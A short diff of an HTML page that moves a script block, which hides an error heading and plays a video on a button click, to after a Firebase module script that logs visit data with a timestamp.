@@ -28,19 +28,7 @@
             cursor: pointer;
         }
     </style>
-    <script>
-        function hideError(){
-            document.querySelector('h1').style.display = 'none'
-            document.querySelector('button').style.display = 'none'
-        }
-        function btnClick(){
-            hideError()
-            document.querySelector('video').style.display = 'unset'
-            document.querySelector('video').play()
-            commitData(data, window.D,true)
-        }
-    </script>
-    <script type="module">
+        <script type="module">
         window.D = new Date()
         // Import the Firebase modules
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
@@ -87,5 +75,18 @@
         console.log(data)
         commitData(data, window.D,false)
     </script>
+    <script>
+        function hideError(){
+            document.querySelector('h1').style.display = 'none'
+            document.querySelector('button').style.display = 'none'
+        }
+        function btnClick(){
+            hideError()
+            document.querySelector('video').style.display = 'unset'
+            document.querySelector('video').play()
+            commitData(data, window.D,true)
+        }
+    </script>
+
 </body>
 </html>
